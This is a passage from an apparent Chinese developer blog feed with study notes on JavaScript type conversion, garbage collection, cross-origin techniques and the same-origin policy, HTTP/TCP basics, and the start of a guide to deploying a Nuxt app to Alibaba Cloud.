        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://www.cnblogs.com/Juphy/p/7085197.html" target="_blank" rel="noopener">JS类型转换（强制和自动的规则）</a></li><li>《JavaScript高级程序设计》</li></ul><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><ul><li>两种类型：基本类型值和引用类型值<ul><li>基本类型：<code>Undefined</code>、<code>Null</code>、<code>Boolean</code>、<code>Number</code>、<code>String</code></li><li>引用类型值：对象</li></ul></li><li>检测类型<ul><li>可以用<code>typeof</code>检测基本数据类型</li><li>可以用<code>instanceof</code>检测引用类型的值</li></ul></li><li>基本类型的值在内存中占据固定大小的空间，保存在栈结构中；引用类型的值是对象，保存在堆内存中</li></ul><h4 id="JS类型转换"><a href="#JS类型转换" class="headerlink" title="JS类型转换"></a>JS类型转换</h4><ul><li><p><strong>Number(mix)</strong></p><ul><li>布尔值<code>true</code>和<code>false</code>转换为<code>1</code>和<code>0</code></li><li>数字值返回本身</li><li><code>null</code>返回<code>0</code></li><li><code>undefined</code>返回<code>NaN</code></li><li>字符串：<ul><li>只包含数字，则转换成十进制（忽略前导0）</li><li>包含有效浮点格式，则转换为浮点数值（忽略前导0）</li><li>空字符串转换为0</li><li>非以上格式转换为<code>NaN</code></li></ul></li><li>对象调用<code>valueOf()</code>方法再根据规则转换；如果结果为<code>NaN</code>调用<code>toString()</code>方法继续转换</li></ul></li><li><p><strong>parseInt(sring, radix)</strong></p><ul><li>忽略字符串前面空格，直至找到第一个非空字符</li><li>如果第一个字符不是数字符号或者负号，返回<code>NaN</code></li><li>如果第一个字符是数字，则继续解析直至字符串解析完毕或者遇到一个非数字符号为止</li><li>如果上步解析的结果以0开头，则将其当作八进制来解析；如果以0x开头，则将其当作十六进制来解析</li><li>如果指定radix参数，则以radix为基数进行解析</li><li>Number类型转换更加严格，基本上有一个数值非数字就NaN</li></ul></li><li><p>隐式转换</p><ul><li>isNaN()：使用Number()转换后判断是否非数值</li><li>加号运算符：String和其他类型时，其他类型都会转为 String；其他情况，都转化为Number类型；其他运算符：转换为Number类型再计算</li><li>NaN不与任何至相等，包括自身</li><li><code>==</code>的隐式转换<ul><li><code>undefined</code> 等于 <code>null</code></li><li>字符串和数字比较，字符串转数字</li><li>数字、字符串与布尔值比较，两边的值转化为Number</li></ul></li><li>引用类型转换<ul><li>对象转数字时，调用valueOf()</li><li>对象转字符串时，调用toString()</li></ul></li><li>JavaScript里面如果逻辑对象无初始值或者其值为 0、-0、null、””、false、undefined 或者 NaN，那么对象的值为 false</li><li>空数组[]和空对象{}都是object类型，因此直接用于if判断条件时就会被转化为<code>true</code></li><li>例子<pre class=" language-JavaScript"><code class="language-JavaScript">Number([])//0Number({})//NaN10+'20'//102010-'20'//-1010-'one'//NaN10*'20'//200'10'*'20'//200undefined == null // true'0' == 0 // true0 == false // true'0' == false // truenull == false // falseundefined == false // false0 == []//true; 0 == 0'0' == []//false;'0' == '''2' == ['2']//true;2 == '2' -> 2 == 2'2' == [2]//true; '2' == '2'[] == ![]//true; 0 == false -> 0 == 0[] == false // true; 0 == 0{} == false; // false;NaN == 0[1] == [1];//引用类型之间的比较是内存地址的比较，不需要进行隐式转换,</code></pre></li></ul></li></ul><h4 id="执行环境及作用域"><a href="#执行环境及作用域" class="headerlink" title="执行环境及作用域"></a>执行环境及作用域</h4><ul><li>执行环境定义了变量有权访问的其他数据，决定了它们各自的行为</li><li>每个执行环境中都有一个与之相关联的变量对象，环境中定义的所有变量和函数都保存在这个对象中</li><li><strong>作用域链</strong>：代码在一个环境中执行时，会创建变量对象的一个作用域链，作用域链的用途是保证对执行环境有权访问的所有变量和函数的有序访问；作用域链的前端始终是当前执行代码所在环境的变量对象。如果这个环境是函数，则将其活动对象（arguments）作为变量对象；下一个变量对象来自包含环境，这样一致延续到全局执行环境</li><li><strong>let和var的区别</strong><ul><li>let和var都是定义变量关键字</li><li>通过var定义的函数，作用域是当前函数；通过let定义的函数作用域是块级作用域{}</li><li>let在相同的作用域下不能有同名的变量；var可以有同名的变量，而且不会报错；</li></ul></li><li><strong>let和const的区别</strong><ul><li>作用域相同，不能重复声明相同的变量</li><li>let是声明普通变量，const是声明常量</li><li>let初始化可以不赋值，const初始化必须赋值</li><li>let声明的变量值可以被修改，const声明的变量值不能被修改，除对象/引用类；</li></ul></li></ul><h4 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h4><ul><li>JavaScript具有自动垃圾收集机制，即执行环境会负责管理代码执行过程中使用的内存</li><li>原理：找出不再继续使用的变量，释放其占用的内存；为此垃圾收集器会按照固定时间（或代码执行中预定的收集时间）周期性地执行这一操作</li><li><strong>标记清除</strong><ul><li>标记变量的方法：翻转某个特殊位来记录一个变量何时进入环境；或者使用一个“进入环境”列表和“离开环境”列表来跟踪哪个变量发生了变化</li><li>方法：一开始将存储在内存中的所有变量加上标记；去除环境中的变量以及被环境中变量引用的变量的标记；当面再加上标记的变量将被视为准备删除的变量；最后垃圾收集器完成内存清除工作，销毁那些带标记的值并回收它们所占用的空间</li></ul></li><li><strong>引用计数</strong><ul><li>方法：跟踪每个变量被引用的次数；垃圾收集器会释放那些引用计数为0的值占用的空间</li><li>如果两个对象通过各自的属性相互引用，使用引用计数可能无法销毁其占用的内存</li></ul></li><li><strong>解除引用</strong>：为了避免循环引用，最好在不使用的时候将变量设置为<code>null</code></li><li>触发垃圾收集机制通常是在变量达到临界值；动态修改：如果垃圾收集例程回收的内存分配量低于15%可以增大临界值</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 类型转换 </tag>
            
            <tag> 垃圾收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS跨域问题及同源策略</title>
      <link href="/2018/07/04/js-kua-yu-wen-ti-ji-tong-yuan-ce-lue/"/>
      <url>/2018/07/04/js-kua-yu-wen-ti-ji-tong-yuan-ce-lue/</url>
      
        <content type="html"><![CDATA[<h5 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h5><ul><li><a href="https://www.cnblogs.com/wqhwe/p/5407468.html" target="_blank" rel="noopener">HTTP与HTTPS的区别</a></li><li><a href="https://www.jb51.net/article/97611.htm" target="_blank" rel="noopener">js前端解决跨域问题的8种方案</a></li><li><a href="https://www.cnblogs.com/2050/p/3191744.html" target="_blank" rel="noopener">js中几种实用的跨域方法原理详解</a></li><li><a href="https://blog.csdn.net/sssnmnmjmf/article/details/68486261" target="_blank" rel="noopener">简述TCP的三次握手过程</a></li></ul><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><ul><li>URL由协议、域名、端口和路径组成，如果两个URL协议、域名和端口相同，则表示同源。<br>e.g. <em>protocol://hostname[:port]/path/[;parameters][?query]#fragment</em></li><li>同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的js脚本采用ajax读取b.com里面的文件数据是会报错的。</li><li>页面中的链接，重定向以及表单提交是不会受到同源策略限制的。</li><li>跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;</code>等。</li><li>示例如下：</li></ul><table><thead><tr><th style="text-align:left">URL</th><th style="text-align:left">说明</th><th style="text-align:left">是否允许通信</th></tr></thead><tbody><tr><td style="text-align:left"><a href="http://www.a.com/a.js" target="_blank" rel="noopener">http://www.a.com/a.js</a><br><a href="http://www.a.com/b.js" target="_blank" rel="noopener">http://www.a.com/b.js</a></td><td style="text-align:left">同一域名下</td><td style="text-align:left">允许</td></tr><tr><td style="text-align:left"><a href="http://www.a.com/lab/a.js" target="_blank" rel="noopener">http://www.a.com/lab/a.js</a><br><a href="http://www.a.com/script/b.js" target="_blank" rel="noopener">http://www.a.com/script/b.js</a></td><td style="text-align:left">同意域名下不同文件夹</td><td style="text-align:left">允许</td></tr><tr><td style="text-align:left"><a href="http://www.a.com:8000/a.js" target="_blank" rel="noopener">http://www.a.com:8000/a.js</a><br><a href="http://www.a.com/b.js" target="_blank" rel="noopener">http://www.a.com/b.js</a></td><td style="text-align:left">同一域名，不同端口</td><td style="text-align:left">不允许</td></tr><tr><td style="text-align:left"><a href="http://www.a.com/a.js" target="_blank" rel="noopener">http://www.a.com/a.js</a><br><a href="https://www.a.com/b.js" target="_blank" rel="noopener">https://www.a.com/b.js</a></td><td style="text-align:left">同一域名、不同协议</td><td style="text-align:left">不允许</td></tr><tr><td style="text-align:left"><a href="http://www.a.com/a.js" target="_blank" rel="noopener">http://www.a.com/a.js</a><br><a href="http://70.32.92.74/b.js" target="_blank" rel="noopener">http://70.32.92.74/b.js</a></td><td style="text-align:left">域名和域名对应ip</td><td style="text-align:left">不允许</td></tr><tr><td style="text-align:left"><a href="http://www.a.com/a.js" target="_blank" rel="noopener">http://www.a.com/a.js</a><br><a href="http://script.a.com/b.js" target="_blank" rel="noopener">http://script.a.com/b.js</a></td><td style="text-align:left">主域相同，子域不同</td><td style="text-align:left">不允许</td></tr><tr><td style="text-align:left"><a href="http://www.a.com/a.js" target="_blank" rel="noopener">http://www.a.com/a.js</a><br><a href="http://a.com/b.js" target="_blank" rel="noopener">http://a.com/b.js</a></td><td style="text-align:left">同一域名，不同二级域名（同上）</td><td style="text-align:left">不允许</td></tr><tr><td style="text-align:left"><a href="http://www.cnblogs.com/a.js" target="_blank" rel="noopener">http://www.cnblogs.com/a.js</a><br><a href="http://www.a.com/b.js" target="_blank" rel="noopener">http://www.a.com/b.js</a></td><td style="text-align:left">不同域名</td><td style="text-align:left">不允许</td></tr></tbody></table><h4 id="js跨域"><a href="#js跨域" class="headerlink" title="js跨域"></a>js跨域</h4><p><em>js跨域是指通过js在不同的域之间进行数据传输或通信，比如用ajax向一个不同的域请求数据，或者通过js获取页面中不同域的框架中(iframe)的数据。只要协议、域名、端口有任何一个不同，都被当作是不同的域。</em><br>tips: ① 如果是协议和端口造成的跨域问题“前台”是无能为力的。</p><ul><li>解决方案：<ul><li>通过jsonp跨域</li><li>document.domain + iframe跨域</li><li>location.hash + iframe跨域</li><li>window.name + iframe跨域</li><li>postMessage跨域</li><li>跨域资源共享CORS</li><li>nginx代理跨域</li><li>node.js中间件代理跨域</li><li>WebSockt协议跨域</li></ul></li></ul><h6 id="前台解决跨域问题的几种方法"><a href="#前台解决跨域问题的几种方法" class="headerlink" title="前台解决跨域问题的几种方法"></a>前台解决跨域问题的几种方法</h6><p>1.通过修改document.domain(只有主域相同时可以采用该方法)<br>假设在页面A:<a href="http://www.example.com/a.html" target="_blank" rel="noopener">http://www.example.com/a.html</a> 中有一个iframe，它的src是B:<a href="http://www.iframe.example.com/b.html，" target="_blank" rel="noopener">http://www.iframe.example.com/b.html，</a> 这里主域相同但不同域,所以可以：</p><pre class=" language-bash"><code class="language-bash">  //页面A  <span class="token operator">&lt;</span>html<span class="token operator">></span>  <span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>iframe id<span class="token operator">=</span><span class="token string">"iframe"</span> src<span class="token operator">=</span><span class="token string">"http://www.iframe.example.com/b.html"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>    <span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> onload<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      var iframe <span class="token operator">=</span> document.getElementById<span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      var win <span class="token operator">=</span> iframe.contentWindow<span class="token punctuation">;</span>      var doc <span class="token operator">=</span> win.document<span class="token punctuation">;</span>//不设置跨域获取不到对象和属性      var name <span class="token operator">=</span> win.name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">&lt;</span>/script<span class="token operator">></span>  <span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span>//在页面B中设置：<span class="token operator">&lt;</span>script<span class="token operator">></span>document.domain <span class="token operator">=</span> <span class="token string">"example.com"</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>tips: 我们只能把document.domain设置成自身或更高一级的父域，且主域必须相同。例如：a.b.example.com 中某个文档的document.domain 可以设成a.b.example.com、b.example.com 、example.com中的任意一个，但是不可以设成 c.a.b.example.com,因为这是当前域的子域。</p><p>2.通过jsonp跨域:在页面上引入不同域的脚本文件来实现</p><pre class=" language-bash"><code class="language-bash">  //原生js  <span class="token operator">&lt;</span>script<span class="token operator">></span>  <span class="token keyword">function</span> dosomething<span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">#statements</span>  <span class="token punctuation">}</span>  <span class="token operator">&lt;</span>/script<span class="token operator">></span>  <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://example.com/data.php?callback=dosomething"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>  //Jquery  <span class="token operator">&lt;</span>script<span class="token operator">></span>  $.getJson<span class="token punctuation">(</span><span class="token string">'http://example.com/data.php?callback=?'</span>, function<span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">#statements</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>3.通过HTML5新引进的window.postMessage方法来跨域传送数据</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//页面a</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">function</span> <span class="token function">onload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> win <span class="token operator">=</span> iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>  win<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"hello from a"</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>iframe id<span class="token operator">=</span><span class="token string">"iframe"</span> src<span class="token operator">=</span><span class="token string">"http://www.test.com/b.html"</span> onload<span class="token operator">=</span><span class="token string">"onload()"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token comment" spellcheck="true">//页面b</span><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>  e <span class="token operator">=</span> e <span class="token operator">||</span> event<span class="token punctuation">;</span>  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"receive:"</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token string">";hello from b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>4.location.hash + iframe<br>假设域名a.com下的文件a.html要和b.com下的b.html传递信息</p><ul><li>a.html首先创建自动隐藏的iframe, iframe的src志向b.com下的b.html页面</li><li>b.html响应请求后再通过修改a.html的hash值来传递数据</li><li>在a.html加一个定时器，隔一段时间来判断location.hash值有没有变化，有则获取hash值<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//页面a</span><span class="token keyword">function</span> <span class="token function">startRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ifr <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ifr<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>ifr<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://www.b.com/b.html#paramdo'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>ifr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">checkHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">var</span> data <span class="token operator">=</span> location<span class="token punctuation">.</span>hash <span class="token operator">?</span> location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Now the data is '</span><span class="token operator">+</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">setInterval</span><span class="token punctuation">(</span>checkHash<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 页面b 模拟一个简单的参数处理操作</span><span class="token keyword">switch</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string">'#paramdo'</span><span class="token punctuation">:</span><span class="token function">callBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'#paramset'</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">//do something……</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">callBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span>parent<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> <span class="token string">'somedata'</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// ie、chrome的安全机制无法修改parent.location.hash，</span><span class="token comment" spellcheck="true">// 所以要利用一个中间的b域下的代理iframe</span><span class="token keyword">var</span> ifrproxy <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ifrproxy<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>ifrproxy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://a.com/test/cscript/cs3.html#somedata'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 注意该文件在"a.com"域下</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>ifrproxy<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//页面c</span>parent<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><p>5.window.name + iframe</p><ul><li>name 值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）</li></ul><p>6.websocket</p><ul><li>web sockets是一种浏览器的API，它的目标是在一个单独的持久连接上提供全双工、双向通信。(同源策略对web sockets不适用)</li><li>web sockets原理：在JS创建了web socket之后，会有一个HTTP请求发送到浏览器以发起连接。取得服务器响应后，建立的连接会使用HTTP升级从HTTP协议交换为web sockt协议。</li><li>只有在支持web socket协议的服务器上才能正常工作。<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSockt</span><span class="token punctuation">(</span><span class="token string">'ws://www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//http->ws; https->wss</span>socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello WebSockt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>socket<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> data <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="服务端跨域方案"><a href="#服务端跨域方案" class="headerlink" title="服务端跨域方案"></a>服务端跨域方案</h4><ol><li>Nginx<ul><li>代理服务器，客户机在发送请求时，不会直接发送给目的主机，而是先发送给代理服务器，代理服务接受客户机请求之后，再向主机发出，并接收目的主机返回的数据，存放在代理服务器的硬盘中，再发送给客户机</li><li>Nginx是一款轻量级的HTTP服务器/反向代理服务器及电子邮件代理服务器；静态页面的服务器、静态文件缓存服务器、网站反向代理、负载均衡服务器；</li><li>正向代理隐藏了客户端的信息；反向代理隐藏了服务端的信息；</li><li>正向代理，架设在客户机与目标主机之间，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中</li><li>反向代理服务器架设在服务器端，通过缓冲经常被请求的页面来缓解服务器的工作量，将客户机请求转发给内部网络上的目标服务器；并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器与目标主机一起对外表现为一个服务器</li><li>将服务器接收到的请求按照规则分发的过程，称为负载均衡；负载均衡调度算法如下：<ul><li>weight轮询：接收到的请求按照顺序逐一分配到不同的后端服务器，可以给不同的后端服务器设置一个权重值（weight），用于调整不同的服务器上请求的分配率；权重数据越大，被分配到请求的几率越大</li><li>ip_hash：每个请求按照发起客户端的ip的hash结果进行匹配，这样的算法下一个固定ip地址的客户端总会访问到同一个后端服务器，这也在一定程度上解决了集群部署环境下session共享的问题</li><li>fair：智能调整调度算法，动态的根据后端服务器的请求处理到响应的时间进行均衡分配，响应时间短处理效率高的服务器分配到请求的概率高，响应时间长处理效率低的服务器分配到的请求少</li><li>url_hash：按照访问的url的hash结果分配请求，每个请求的url会指向后端固定的某个服务器，可以在nginx作为静态服务器的情况下提高缓存效率</li></ul></li><li>使用Nginx在服务端进行反向代理，在浏览器端访问的域名和协议端口是一样的，代理隐藏了服务器细节，例子：<pre class=" language-bash"><code class="language-bash">location /api/ <span class="token punctuation">{</span>rewrite ^/api/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>$ /<span class="token variable">$1</span> <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">#所有对后端的请求加一个api前缀方便区分，真正访问的时候移除这个前缀</span><span class="token comment" spellcheck="true"># API Server</span>proxy_pass http://www.serverA.com<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">#将真正的请求代理到serverA,即真实的服务器地址，ajax的url为/api/user/1的请求将会访问http://www.serverA.com/user/1</span><span class="token punctuation">}</span></code></pre></li></ul></li></ol><h4 id="补充：HTTP和HTTPS协议的区别"><a href="#补充：HTTP和HTTPS协议的区别" class="headerlink" title="补充：HTTP和HTTPS协议的区别"></a>补充：HTTP和HTTPS协议的区别</h4><ul><li>HTTP(超文本传输协议)被用在Web浏览器和网站服务器之间传递信息，HTTP协议以明文方式发送内容，不提供数据加密。</li><li>HTTPS(安全套接字层超文本传输协议)在HTTP的基础上加入了SSL协议，SSL依靠证书来验证服务器的身份，并未浏览器和服务器之间的通信加密。</li><li>HTTPS协议的主要作用：①建立一个信息安全通道，保证数据传输安全； ②确认网站的真实性；</li><li>HTTPS协议需要申请CA证书，一般免费证书较少，需要一定费用。</li><li>HTTP采用端口号80；HTTPS采用端口号443；</li><li>HTTP的连接是无状态的；HTTPS由HTTP+SSL协议构建，可进行加密传输、身份认证的网络协议，更安全。</li><li>HTTP协议握手阶段比较费时，连接缓存不如HTTP高效。</li></ul><h4 id="补充：TCP三次握手与四次挥手"><a href="#补充：TCP三次握手与四次挥手" class="headerlink" title="补充：TCP三次握手与四次挥手"></a>补充：TCP三次握手与四次挥手</h4><ul><li>三次握手<br><img src="/img/in-post/tcp3.JPG" alt=""></li><li>第一次握手：Client将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</li><li>第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。</li><li><p>第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</p></li><li><p>四次挥手<br><img src="/img/in-post/tcp4.JPG" alt=""></p></li><li>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。</li><li>第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</li><li>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</li><li>第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨域 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将Nuxt项目部署到阿里云</title>
      <link href="/2018/05/29/jiang-nuxt-xiang-mu-bu-shu-dao-a-li-yun/"/>
      <url>/2018/05/29/jiang-nuxt-xiang-mu-bu-shu-dao-a-li-yun/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料及博客"><a href="#参考资料及博客" class="headerlink" title="参考资料及博客"></a>参考资料及博客</h4><ol><li><a href="https://segmentfault.com/a/1190000012709705" target="_blank" rel="noopener">pm2的使用</a></li><li><a href="https://blog.csdn.net/xiongqiangwin1314/article/details/76451506" target="_blank" rel="noopener">从零开始部署Node.js服务至阿里云ECS服务器并实现外网IP访问</a></li><li><a href="https://www.jb51.net/article/120666.htm?utm_source=debugrun&amp;utm_medium=referral" target="_blank" rel="noopener">在阿里云centos下部署mongodb教程</a></li><li><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html" target="_blank" rel="noopener">在阿里云centos下安装nodejs</a></li><li><a href="https://help.aliyun.com/document_detail/25471.html" target="_blank" rel="noopener">阿里云配置安全组规则</a></li></ol><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>具体框架搭建，见：<a href="https://blog.csdn.net/S_Mars/article/details/80898695" target="_blank" rel="noopener">链接</a><br>在阿里云实例，配置安全组规则<br>添加入方向http/https/tcp 80端口规则</p><h4 id="系统应用服务器软件安装与配置"><a href="#系统应用服务器软件安装与配置" class="headerlink" title="系统应用服务器软件安装与配置"></a>系统应用服务器软件安装与配置</h4><h5 id="Node的安装"><a href="#Node的安装" class="headerlink" title="Node的安装"></a>Node的安装</h5><pre><code>#下载源码  cd /usr/local/src/  wget http://nodejs.org/dist/v8.11.3/node-v8.11.3.tar.gz  #解压  tar zxvf node-v8.11.3.tar.gz  #编译安装  cd node-v8.11.3  ./configure --prefix=/usr/local/node/8.11.3  make  make install  #配置NODE_HOME，进入profile编辑环境变量  vim /etc/profile  #set for nodejs  #设置nodejs环境变量  export NODE_HOME=/usr/local/node/8.11.3  export PATH=$NODE_HOME/bin:$PATH  source /etc/profile  #验证node是否安装配置成功  node -v  #验证npm是否安装配置成功  npm -v  </code></pre><h5 id="pm2-安装"><a href="#pm2-安装" class="headerlink" title="pm2 安装"></a>pm2 安装</h5><pre><code>npm install pm2 -g  </code></pre><h5 id="MongoDB安装"><a href="#MongoDB安装" class="headerlink" title="MongoDB安装"></a>MongoDB安装</h5><pre><code>#修改yum包管理配置：  vi /etc/yum.repos.d/mongodb-org-3.4.repo  #复制下面配置信息：  [mongodb-org-3.4]  name=MongoDB Repository  